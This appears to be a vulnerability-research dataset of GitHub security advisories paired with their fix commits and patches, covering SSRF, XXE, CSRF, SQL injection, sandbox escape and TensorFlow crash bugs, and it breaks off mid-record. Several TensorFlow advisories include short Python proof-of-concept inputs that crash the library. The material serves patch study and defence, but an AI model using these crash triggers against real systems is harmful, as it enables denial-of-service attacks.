'https:\/\/github.com\/ffi\/ffi\/raw\/09e0c6076466b4383da7fa4e13f714311109945a\/lib%2Fffi%2Flibrary.rb', 'patch': '@@ -125,7 +125,7 @@ def ffi_lib(*names)\\n                 retry\\n               else\\n                 # TODO better library lookup logic\\n-                unless libname.start_with?(\"\/\")\\n+                unless libname.start_with?(\"\/\") || FFI::Platform.windows?\\n                   path = [\\'\/usr\/lib\/\\',\\'\/usr\/local\/lib\/\\'].find do |pth|\\n                     File.exist?(pth + libname)\\n                   end'}}","message_norm":"don't search in hardcoded paths on windows\n\nnative windows apps don't use \"\/usr\" path to store system dlls.\nit's even more harm than good to search through these directories,\nsince they are used in cygwin and it can lead to accidentaly loading\ncygwin dlls into native windows apps.\n\nhardcoded paths are disabled for mingw and mswin environments only.\nthey are still present on cygwin and msys2, because these posix-api\nbased environments don't use loadlibrary() but dl_open() to load dlls.","language":"en","entities":"[('hardcoded', 'SECWORD', ''), ('hardcoded', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ffi\/library.rb'])","num_files":1.0},{"index":96,"vuln_id":"GHSA-2h63-qp69-fwvw","cwe_id":"{'CWE-918', 'CWE-20'}","score":8.2,"chain":"{'https:\/\/github.com\/apache\/xmlgraphics-batik\/commit\/0ef5b661a1f77772d1110877ea9e0287987098f6'}","dataset":"osv","summary":"Server-side request forgery (SSRF) in Apache Batik Apache Batik 1.13 is vulnerable to server-side request forgery, caused by improper input validation by the NodePickerPanel. By using a specially-crafted argument, an attacker could exploit this vulnerability to cause the underlying server to make arbitrary GET requests.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/apache\/xmlgraphics-batik","commit_href":"https:\/\/github.com\/apache\/xmlgraphics-batik\/commit\/0ef5b661a1f77772d1110877ea9e0287987098f6","commit_sha":"0ef5b661a1f77772d1110877ea9e0287987098f6","patch":"SINGLE","chain_ord":"['0ef5b661a1f77772d1110877ea9e0287987098f6']","before_first_fix_commit":"{'f16e092d0c2ccee07360446e0d4adaa4be5daa1b'}","last_fix_commit":"0ef5b661a1f77772d1110877ea9e0287987098f6","chain_ord_pos":1.0,"commit_datetime":"06\/02\/2020, 13:59:37","message":"BATIK-1284: Dont load DTDs in NodePickerPanel\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/xmlgraphics\/batik\/trunk@1878396 13f79535-47bb-0310-9956-ffa450edef68","author":"Simon Steiner","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'batik-svgbrowser\/src\/main\/java\/org\/apache\/batik\/apps\/svgbrowser\/NodePickerPanel.java': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/xmlgraphics-batik\/raw\/0ef5b661a1f77772d1110877ea9e0287987098f6\/batik-svgbrowser%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fbatik%2Fapps%2Fsvgbrowser%2FNodePickerPanel.java', 'patch': '@@ -847,8 +847,10 @@ private Element parseXml(String xmlString) {\\n         Document doc = null;\\n         DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n         try {\\n-            javax.xml.parsers.DocumentBuilder parser = factory\\n-                    .newDocumentBuilder();\\n+            factory.setFeature(\"http:\/\/xml.org\/sax\/features\/external-general-entities\", false);\\n+            factory.setFeature(\"http:\/\/xml.org\/sax\/features\/external-parameter-entities\", false);\\n+            factory.setFeature(\"http:\/\/apache.org\/xml\/features\/nonvalidating\/load-external-dtd\", false);\\n+            javax.xml.parsers.DocumentBuilder parser = factory.newDocumentBuilder();\\n             parser.setErrorHandler(new ErrorHandler() {\\n                 public void error(SAXParseException exception)\\n                         throws SAXException {'}}","message_norm":"batik-1284: dont load dtds in nodepickerpanel\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/xmlgraphics\/batik\/trunk@1878396 13f79535-47bb-0310-9956-ffa450edef68","language":"da","entities":"[('https:\/\/svn.apache.org\/repos\/asf\/xmlgraphics\/batik\/trunk@1878396', 'URL', ''), ('13f79535', 'SHA', 'generic_sha'), ('ffa450edef68', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['batik-svgbrowser\/src\/main\/java\/org\/apache\/batik\/apps\/svgbrowser\/NodePickerPanel.java'])","num_files":1.0},{"index":97,"vuln_id":"GHSA-2hjr-fg6c-v2h6","cwe_id":"{'CWE-200'}","score":6.5,"chain":"{'https:\/\/github.com\/HubSpot\/jinjava\/pull\/435\/commits\/1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165', 'https:\/\/github.com\/HubSpot\/jinjava\/pull\/426\/commits\/5dfa5b87318744a4d020b66d5f7747acc36b213b'}","dataset":"osv","summary":"Unauthorized access to Class instance in Jinjava Jinjava before 2.5.4 allow access to arbitrary classes by calling Java methods on objects passed into a Jinjava context. This could allow for abuse of the application class loader, including Arbitrary File Disclosure.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/HubSpot\/jinjava","commit_href":"https:\/\/github.com\/HubSpot\/jinjava\/pull\/435\/commits\/1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165","commit_sha":"1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165","patch":"MULTI","chain_ord":"['5dfa5b87318744a4d020b66d5f7747acc36b213b', '1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165']","before_first_fix_commit":"{'bfc6ecde3a98db02a00c87a3b905a0af907188f0'}","last_fix_commit":"1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165","chain_ord_pos":2.0,"commit_datetime":"04\/28\/2020, 18:20:50","message":"Add interpreter to blacklist","author":"Matt Coley","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'src\/main\/java\/com\/hubspot\/jinjava\/el\/ext\/JinjavaBeanELResolver.java': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/HubSpot\/jinjava\/raw\/1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165\/src%2Fmain%2Fjava%2Fcom%2Fhubspot%2Fjinjava%2Fel%2Fext%2FJinjavaBeanELResolver.java', 'patch': '@@ -2,6 +2,7 @@\\n \\n import com.google.common.base.CaseFormat;\\n import com.google.common.collect.ImmutableSet;\\n+import com.hubspot.jinjava.interpret.JinjavaInterpreter;\\n import java.lang.reflect.Constructor;\\n import java.lang.reflect.Field;\\n import java.lang.reflect.Method;\\n@@ -136,7 +137,8 @@ protected boolean isRestrictedClass(Object o) {\\n       o instanceof Thread ||\\n       o instanceof Method ||\\n       o instanceof Field ||\\n-      o instanceof Constructor\\n+      o instanceof Constructor ||\\n+      o instanceof JinjavaInterpreter\\n     );\\n   }\\n }'}}","message_norm":"add interpreter to blacklist","language":"sv","entities":"[('add', 'ACTION', ''), ('blacklist', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/hubspot\/jinjava\/el\/ext\/JinjavaBeanELResolver.java'])","num_files":1.0},{"index":98,"vuln_id":"GHSA-2hjr-fg6c-v2h6","cwe_id":"{'CWE-200'}","score":6.5,"chain":"{'https:\/\/github.com\/HubSpot\/jinjava\/pull\/435\/commits\/1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165', 'https:\/\/github.com\/HubSpot\/jinjava\/pull\/426\/commits\/5dfa5b87318744a4d020b66d5f7747acc36b213b'}","dataset":"osv","summary":"Unauthorized access to Class instance in Jinjava Jinjava before 2.5.4 allow access to arbitrary classes by calling Java methods on objects passed into a Jinjava context. This could allow for abuse of the application class loader, including Arbitrary File Disclosure.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/HubSpot\/jinjava","commit_href":"https:\/\/github.com\/HubSpot\/jinjava\/pull\/426\/commits\/5dfa5b87318744a4d020b66d5f7747acc36b213b","commit_sha":"5dfa5b87318744a4d020b66d5f7747acc36b213b","patch":"MULTI","chain_ord":"['5dfa5b87318744a4d020b66d5f7747acc36b213b', '1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165']","before_first_fix_commit":"{'bfc6ecde3a98db02a00c87a3b905a0af907188f0'}","last_fix_commit":"1b9aaa4b420c58b4a301cf4b7d26207f1c8d1165","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2020, 17:49:08","message":"add method to blacklist","author":"Matt Coley","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'src\/main\/java\/com\/hubspot\/jinjava\/el\/ext\/JinjavaBeanELResolver.java': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/HubSpot\/jinjava\/raw\/5dfa5b87318744a4d020b66d5f7747acc36b213b\/src%2Fmain%2Fjava%2Fcom%2Fhubspot%2Fjinjava%2Fel%2Fext%2FJinjavaBeanELResolver.java', 'patch': '@@ -2,6 +2,7 @@\\n \\n import com.google.common.base.CaseFormat;\\n import com.google.common.collect.ImmutableSet;\\n+import java.lang.reflect.Method;\\n import java.util.Set;\\n import javax.el.BeanELResolver;\\n import javax.el.ELContext;\\n@@ -111,7 +112,12 @@ private String transformPropertyName(Object property) {\\n   }\\n \\n   private void checkRestrictedClass(Object o, Object method) {\\n-    if (o instanceof Class || o instanceof ClassLoader || o instanceof Thread) {\\n+    if (\\n+      o instanceof Class ||\\n+      o instanceof ClassLoader ||\\n+      o instanceof Thread ||\\n+      o instanceof Method\\n+    ) {\\n       throw new MethodNotFoundException(\\n         \"Cannot find method \\'\" + method + \"\\' in \" + o.getClass()\\n       );'}}","message_norm":"add method to blacklist","language":"cy","entities":"[('add', 'ACTION', ''), ('blacklist', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/hubspot\/jinjava\/el\/ext\/JinjavaBeanELResolver.java'])","num_files":1.0},{"index":102,"vuln_id":"GHSA-2hxv-mx8x-mcj9","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/denkGroot\/Spina\/commit\/bfe44f289e336f80b6593032679300c493735e75'}","dataset":"osv","summary":"Spina vulnerable to a cross-site request forgery (CSRF) vulnerability Cross-site request forgery (CSRF) vulnerability in Spina before commit bfe44f289e336f80b6593032679300c493735e75.","published_date":"2018-08-28","chain_len":1,"project":"https:\/\/github.com\/denkGroot\/Spina","commit_href":"https:\/\/github.com\/denkGroot\/Spina\/commit\/bfe44f289e336f80b6593032679300c493735e75","commit_sha":"bfe44f289e336f80b6593032679300c493735e75","patch":"SINGLE","chain_ord":"['bfe44f289e336f80b6593032679300c493735e75']","before_first_fix_commit":"{'2b3e8f724a97b312a61503f378a5ce6def58bfe2'}","last_fix_commit":"bfe44f289e336f80b6593032679300c493735e75","chain_ord_pos":1.0,"commit_datetime":"06\/16\/2015, 14:23:27","message":"protect from forgery","author":"Bram Jetten","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'app\/controllers\/spina\/application_controller.rb': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/denkGroot\/Spina\/raw\/bfe44f289e336f80b6593032679300c493735e75\/app%2Fcontrollers%2Fspina%2Fapplication_controller.rb', 'patch': '@@ -1,5 +1,7 @@\\n module Spina\\n   class ApplicationController < ActionController::Base\\n+    protect_from_forgery\\n+    \\n     include ApplicationHelper\\n \\n     private'}}","message_norm":"protect from forgery","language":"en","entities":"[('protect', 'SECWORD', ''), ('forgery', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/controllers\/spina\/application_controller.rb'])","num_files":1.0},{"index":107,"vuln_id":"GHSA-2jx3-5j9v-prpp","cwe_id":"{'CWE-89'}","score":8.1,"chain":"{'https:\/\/github.com\/PrestaShop\/blockwishlist\/commit\/b3ec4b85af5fd73f74d55390b226d221298ca084'}","dataset":"osv","summary":"BlockWishList SQL Injection vulnerability ### Impact\nAn authenticated customer can perform SQL injection\n\n### Patches\nIssue is fixed in 2.1.1","published_date":"2022-06-25","chain_len":1,"project":"https:\/\/github.com\/PrestaShop\/blockwishlist","commit_href":"https:\/\/github.com\/PrestaShop\/blockwishlist\/commit\/b3ec4b85af5fd73f74d55390b226d221298ca084","commit_sha":"b3ec4b85af5fd73f74d55390b226d221298ca084","patch":"SINGLE","chain_ord":"['b3ec4b85af5fd73f74d55390b226d221298ca084']","before_first_fix_commit":"{'13e64b2709544354fd116927b80bc3fa249bc5b4', 'be79516175d564f60a657627482b0a60c3da353e'}","last_fix_commit":"b3ec4b85af5fd73f74d55390b226d221298ca084","chain_ord_pos":1.0,"commit_datetime":"06\/24\/2022, 08:04:52","message":"Merge pull request from GHSA-2jx3-5j9v-prpp\n\nValidate order by and order way","author":"atomiix","comments":"{'com_1': {'author': 'doekia', 'datetime': '07\/22\/2022, 17:26:35', 'body': \"So apparently there is unfiltered value returned by toLegacyOrderWay() (I'm doubt full of it see below)\\r\\nIf this is the case CHANGE the function, not simply one module otherwise it is an open door for other modules.\\r\\n\\r\\nWhy I'm doubtfull ? Because toLegacyOrderWay() calls getDirection() which return $this->direction. $this->direction is set by setDirection() (during construct) and tests are done against values asc, desc, random otherwise exception. How can this lead to sql injection\"}, 'com_2': {'author': 'infiniweb', 'datetime': '07\/22\/2022, 21:40:39', 'body': '@doekia this issue is not with `toLegacyOrderWay`. The SQL injection can be reproduced because of the usage of `toLegacyOrderBy` (not `toLegacyOrderWay`) combined with a wrong usage of `getLegacyPrefix`. I can confirm the exploit. The usage of `Validate::isOrderBy($sortOrder)` is fixing the issue.'}, 'com_3': {'author': 'doekia', 'datetime': '07\/25\/2022, 18:07:12', 'body': 'Therefore I repeat, the function that need to be patched SHOULD BE toLegacyOrderBy() that should implement the Validate::isOrderBy() before returning values.\\r\\nSuch way will protect ANY modules that use the framework function toLegacyOrderBy()'}, 'com_4': {'author': 'Pilypas', 'datetime': '07\/27\/2022, 11:25:43', 'body': 'Can you tell me if the vulnerability in the module is also in Prestashop 1.6.1.24 version of blockwishlist 1.3.2 ?'}, 'com_5': {'author': 'infiniweb', 'datetime': '07\/27\/2022, 11:27:28', 'body': \"@Pilypas . No it's not. Please refer to https:\/\/github.com\/PrestaShop\/blockwishlist\/security\/advisories\/GHSA-2jx3-5j9v-prpp\"}}","stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'src\/Search\/WishListProductSearchProvider.php': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PrestaShop\/blockwishlist\/raw\/b3ec4b85af5fd73f74d55390b226d221298ca084\/src%2FSearch%2FWishListProductSearchProvider.php', 'patch': \"@@ -35,6 +35,7 @@\\n use Product;\\n use Shop;\\n use Symfony\\\\Component\\\\Translation\\\\TranslatorInterface;\\n+use Validate;\\n use WishList;\\n \\n \/**\\n@@ -167,7 +168,10 @@ private function getProductsOrCount(\\n \\n         if ('products' === $type) {\\n             $sortOrder = $query->getSortOrder()->toLegacyOrderBy(true);\\n-            $querySearch->orderBy($sortOrder . ' ' . $query->getSortOrder()->toLegacyOrderWay());\\n+            $sortWay = $query->getSortOrder()->toLegacyOrderWay();\\n+            if (Validate::isOrderBy($sortOrder) && Validate::isOrderWay($sortWay)) {\\n+                $querySearch->orderBy($sortOrder . ' ' . $sortWay);\\n+            }\\n             $querySearch->limit((int) $query->getResultsPerPage(), ((int) $query->getPage() - 1) * (int) $query->getResultsPerPage());\\n             $products = $this->db->executeS($querySearch);\"}}","message_norm":"merge pull request from ghsa-2jx3-5j9v-prpp\n\nvalidate order by and order way","language":"no","entities":"[('ghsa-2jx3-5j9v-prpp', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Search\/WishListProductSearchProvider.php'])","num_files":1.0},{"index":108,"vuln_id":"GHSA-2jx8-v4hv-gx3h","cwe_id":"{'CWE-611'}","score":7.5,"chain":"{'https:\/\/github.com\/reportportal\/service-api\/commit\/da4a012abdcc69f02f4255d81466f1f473b7f418'}","dataset":"osv","summary":"XXE vulnerability in Launch import | Release Date | Affected Projects | Affected Versions | Access Vector| Security Risk |\n|--------------|-------------------|-------------------|---------------|---------------|\n| Monday, May 4, 2020| [service-api](https:\/\/github.com\/reportportal\/service-api) | Every version, starting from 3.1.0 | Remote | Medium |\n\n### Impact\nStarting from version 3.1.0 we introduced a new feature of JUnit XML launch import. Unfortunately XML parser was not configured properly to prevent XML external entity (XXE) attacks. This allows a user to import a specifically-crafted XML file that uses external entities for extraction of secrets from Report Portal service-api module or server-side request forgery.\n\nReport Portal versions 4.3.12+ and 5.1.1+ disables external entity resolution for theirs XML parser.\n\nWe advise our users install the latest releases we built specifically to address this issue.\n\n### Patches\nFixed with https:\/\/github.com\/reportportal\/service-api\/pull\/1201\n\n### Binary Download\nhttps:\/\/bintray.com\/epam\/reportportal\/service-api\/5.1.1\nhttps:\/\/bintray.com\/epam\/reportportal\/service-api\/4.3.12\n\n### Docker Container Download\n* RP v4: `docker pull reportportal\/service-api:4.3.12`\n* RP v5: `docker pull reportportal\/service-api:5.1.1`\n\n### Acknowledgement\nThe issue was reported to Report Portal Team by an external security researcher.\nOur Team thanks Julien M. for reporting the issue.\n\n### For more information\nIf you have any questions or comments about this advisory email us: [support@reportportal.io](mailto:support@reportportal.io)","published_date":"2021-06-28","chain_len":1,"project":"https:\/\/github.com\/reportportal\/service-api","commit_href":"https:\/\/github.com\/reportportal\/service-api\/commit\/da4a012abdcc69f02f4255d81466f1f473b7f418","commit_sha":"da4a012abdcc69f02f4255d81466f1f473b7f418","patch":"SINGLE","chain_ord":"['da4a012abdcc69f02f4255d81466f1f473b7f418']","before_first_fix_commit":"{'afbd14d404c4084cfdd17d60685f8984949b1350', '74a954601ad9eea14a0650f5c1ae9bd91031e2ba'}","last_fix_commit":"da4a012abdcc69f02f4255d81466f1f473b7f418","chain_ord_pos":1.0,"commit_datetime":"04\/30\/2020, 21:14:46","message":"Merge pull request #1201 from reportportal\/sax-hotfix\n\nsax vulnerability fix","author":"Pavel Bortnik","comments":null,"stats":"{'additions': 18, 'deletions': 1, 'total': 19}","files":"{'src\/main\/java\/com\/epam\/ta\/reportportal\/core\/imprt\/impl\/junit\/XunitParseJob.java': {'additions': 18, 'deletions': 1, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/reportportal\/service-api\/raw\/da4a012abdcc69f02f4255d81466f1f473b7f418\/src%2Fmain%2Fjava%2Fcom%2Fepam%2Fta%2Freportportal%2Fcore%2Fimprt%2Fimpl%2Fjunit%2FXunitParseJob.java', 'patch': '@@ -24,8 +24,10 @@\\n import org.springframework.context.annotation.Scope;\\n import org.springframework.stereotype.Component;\\n import org.xml.sax.SAXException;\\n+import org.xml.sax.XMLReader;\\n \\n import javax.xml.parsers.ParserConfigurationException;\\n+import javax.xml.parsers.SAXParser;\\n import javax.xml.parsers.SAXParserFactory;\\n import java.io.IOException;\\n import java.io.InputStream;\\n@@ -43,7 +45,22 @@ public class XunitParseJob implements Callable<ParseResults> {\\n \\t@Override\\n \\tpublic ParseResults call() {\\n \\t\\ttry {\\n-\\t\\t\\tSAXParserFactory.newInstance().newSAXParser().parse(xmlInputStream, handler);\\n+\\t\\t\\tSAXParserFactory spf = SAXParserFactory.newInstance();\\n+\\t\\t\\tSAXParser saxParser = spf.newSAXParser();\\n+\\t\\t\\tXMLReader reader = saxParser.getXMLReader();\\n+\\n+\\t\\t\\t\/\/ Xerces 1 - http:\/\/xerces.apache.org\/xerces-j\/features.html#external-general-entities\\n+\\t\\t\\t\/\/ Xerces 2 - http:\/\/xerces.apache.org\/xerces2-j\/features.html#external-general-entities\\n+\\n+\\t\\t\\t\/\/ Using the SAXParserFactory\\'s setFeature\\n+\\t\\t\\tspf.setFeature(\"http:\/\/xml.org\/sax\/features\/external-general-entities\", false);\\n+\\t\\t\\t\/\/ Using the XMLReader\\'s setFeature\\n+\\t\\t\\treader.setFeature(\"http:\/\/xml.org\/sax\/features\/external-general-entities\", false);\\n+\\n+\\t\\t\\t\/\/ Xerces 2 only - http:\/\/xerces.apache.org\/xerces-j\/features.html#external-general-entities\\n+\\t\\t\\tspf.setFeature(\"http:\/\/apache.org\/xml\/features\/disallow-doctype-decl\", true);\\n+\\n+\\t\\t\\tsaxParser.parse(xmlInputStream, handler);\\n \\t\\t} catch (SAXException | IOException | ParserConfigurationException e) {\\n \\t\\t\\tthrow new ReportPortalException(ErrorType.PARSING_XML_ERROR, e.getMessage());\\n \\t\\t}'}}","message_norm":"merge pull request #1201 from reportportal\/sax-hotfix\n\nsax vulnerability fix","language":"ca","entities":"[('#1201', 'ISSUE', ''), ('sax', 'SECWORD', ''), ('hotfix', 'ACTION', ''), ('sax', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/epam\/ta\/reportportal\/core\/imprt\/impl\/junit\/XunitParseJob.java'])","num_files":1.0},{"index":124,"vuln_id":"GHSA-2p9q-h29j-3f5v","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/290bb05c80c327ed74fae1d089f1001b1e2a4ef7'}","dataset":"osv","summary":"Missing validation causes `TensorSummaryV2` to crash ### Impact\nThe implementation of [`tf.raw_ops.TensorSummaryV2`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/summary_tensor_op.cc#L33-L58) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntf.raw_ops.TensorSummaryV2(\n  tag=np.array('test'),\n  tensor=np.array(3),\n  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))\n```\n\nThe code assumes `axis` is a scalar but there is no validation for this.\n\n```cc\n    const Tensor& serialized_summary_metadata_tensor = c->input(2);\n    \/\/ ...\n    ParseFromTString(serialized_summary_metadata_tensor.scalar<tstring>()(),\n                     v->mutable_metadata());\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [290bb05c80c327ed74fae1d089f1001b1e2a4ef7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/290bb05c80c327ed74fae1d089f1001b1e2a4ef7).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n    \n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University and Hong Jin from Singapore Management University.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/290bb05c80c327ed74fae1d089f1001b1e2a4ef7","commit_sha":"290bb05c80c327ed74fae1d089f1001b1e2a4ef7","patch":"SINGLE","chain_ord":"['290bb05c80c327ed74fae1d089f1001b1e2a4ef7']","before_first_fix_commit":"{'263ad6ad211921b34c5fa5c3460e177d855d1101'}","last_fix_commit":"290bb05c80c327ed74fae1d089f1001b1e2a4ef7","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 18:02:25","message":"Fix tf.raw_ops.TensorSummaryV2 vulnerability with invalid serialized_summary_metadata.\n\nCheck that input is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445197183","author":"Alan Liu","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/summary_tensor_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/290bb05c80c327ed74fae1d089f1001b1e2a4ef7\/tensorflow%2Fcore%2Fkernels%2Fsummary_tensor_op.cc', 'patch': '@@ -36,6 +36,10 @@ class SummaryTensorOpV2 : public OpKernel {\\n                 errors::InvalidArgument(\"tag must be scalar\"));\\n     const Tensor& tensor = c->input(1);\\n     const Tensor& serialized_summary_metadata_tensor = c->input(2);\\n+    OP_REQUIRES(\\n+        c,\\n+        TensorShapeUtils::IsScalar(serialized_summary_metadata_tensor.shape()),\\n+        errors::InvalidArgument(\"serialized_summary_metadata must be scalar\"));\\n \\n     Summary s;\\n     Summary::Value* v = s.add_value();'}}","message_norm":"fix tf.raw_ops.tensorsummaryv2 vulnerability with invalid serialized_summary_metadata.\n\ncheck that input is actually a scalar before treating it as such.\n\npiperorigin-revid: 445197183","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('serialized_summary_metadata', 'SECWORD', ''), ('445197183', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/summary_tensor_op.cc'])","num_files":1.0},{"index":130,"vuln_id":"GHSA-2r2c-g63r-vccr","cwe_id":"{'CWE-347'}","score":5.3,"chain":"{'https:\/\/github.com\/digitalbazaar\/forge\/commit\/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1', 'https:\/\/github.com\/digitalbazaar\/forge\/commit\/bb822c02df0b61211836472e29b9790cc541cdb2'}","dataset":"osv","summary":"Improper Verification of Cryptographic Signature in `node-forge` ### Impact\n\nRSA PKCS#1 v1.5 signature verification code is not properly checking `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)","published_date":"2022-03-18","chain_len":2,"project":"https:\/\/github.com\/digitalbazaar\/forge","commit_href":"https:\/\/github.com\/digitalbazaar\/forge\/commit\/bb822c02df0b61211836472e29b9790cc541cdb2","commit_sha":"bb822c02df0b61211836472e29b9790cc541cdb2","patch":"MULTI","chain_ord":"['3f0b49a0573ef1bb7af7f5673c0cfebf00424df1', 'bb822c02df0b61211836472e29b9790cc541cdb2']","before_first_fix_commit":"{'d4395fec831622837ecfec9e428d4620e208f9a8'}","last_fix_commit":"bb822c02df0b61211836472e29b9790cc541cdb2","chain_ord_pos":2.0,"commit_datetime":"03\/17\/2022, 22:54:51","message":"Add advisory links.","author":"David I. Lehn","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'CHANGELOG.md': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/digitalbazaar\/forge\/raw\/bb822c02df0b61211836472e29b9790cc541cdb2\/CHANGELOG.md', 'patch': '@@ -15,6 +15,8 @@ Forge ChangeLog\\n     [\"Bleichenbacher\\'s RSA signature forgery based on implementation\\n     error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\\n     by Hal Finney.\\n+  - CVE ID: [CVE-2022-24771](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2022-24771)\\n+  - GHSA ID: [GHSA-cfm4-qjh2-4765](https:\/\/github.com\/digitalbazaar\/forge\/security\/advisories\/GHSA-cfm4-qjh2-4765)\\n - **HIGH**: Failing to check tailing garbage bytes can lead to signature\\n   forgery.\\n   - The code does not check for tailing garbage bytes after decoding a\\n@@ -24,10 +26,14 @@ Forge ChangeLog\\n     signature forgery based on implementation\\n     error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\\n     by Hal Finney.\\n+  - CVE ID: [CVE-2022-24772](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2022-24772)\\n+  - GHSA ID: [GHSA-x4jg-mjrx-434g](https:\/\/github.com\/digitalbazaar\/forge\/security\/advisories\/GHSA-x4jg-mjrx-434g)\\n - **MEDIUM**: Leniency in checking type octet.\\n   - `DigestInfo` is not properly checked for proper ASN.1 structure. This can\\n     lead to successful verification with signatures that contain invalid\\n     structures but a valid digest.\\n+  - CVE ID: [CVE-2022-24773](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2022-24773)\\n+  - GHSA ID: [GHSA-2r2c-g63r-vccr](https:\/\/github.com\/digitalbazaar\/forge\/security\/advisories\/GHSA-2r2c-g63r-vccr)\\n \\n ### Fixed\\n - [asn1] Add fallback to pretty print invalid UTF8 data.'}}","message_norm":"add advisory links.","language":"sv","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGELOG.md'])","num_files":1.0},{"index":132,"vuln_id":"GHSA-2r8p-fg3c-wcj4","cwe_id":"{'CWE-125'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bc9c546ce7015c57c2f15c168b3d9201de679a1d'}","dataset":"osv","summary":"Heap OOB and CHECK fail in `ResourceGather` ### Impact\nAn attacker can trigger a crash via a `CHECK`-fail in debug builds of TensorFlow using `tf.raw_ops.ResourceGather` or a read from outside the bounds of heap allocated data in the same API in a release build:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=10,\n  validate_indices=False)\n```\n\nThe 